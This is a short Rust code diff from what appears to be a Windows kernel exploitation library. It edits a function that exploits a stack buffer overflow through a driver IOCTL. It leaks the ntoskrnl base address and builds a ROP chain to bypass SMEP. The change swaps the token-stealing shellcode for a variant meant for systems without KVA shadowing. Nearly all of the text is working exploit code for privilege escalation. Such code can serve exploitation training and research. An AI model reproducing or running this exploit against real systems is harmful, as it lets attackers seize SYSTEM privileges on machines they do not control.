@@ -2,7 +2,7 @@ use core::ffi::c_void;
 use std::iter;
 
 use win_kexp::rop::find_gadget_offset;
-use win_kexp::shellcode::token_stealing_shellcode;
+use win_kexp::shellcode::token_stealing_shellcode_smep_no_kvashadow;
 use win_kexp::util::bytes_to_hex_string;
 use win_kexp::{create_rop_chain, CTL_CODE, IOCTL};
 use win_kexp::{
@@ -67,7 +67,7 @@ fn exploit_stack_buffer_overflow_token_stealing_smep_no_kvashadow() {
     println!("[+] Ntoskrnl base address: 0x{ntoskrnl_address:x}");
 
     println!("[+] Building payload...");
-    let shellcode = token_stealing_shellcode();
+    let shellcode = token_stealing_shellcode_smep_no_kvashadow();
     let (payload, payload_len) = allocate_shellcode(shellcode.as_ptr(), shellcode.len());
 
     let payload_address = payload as u64;
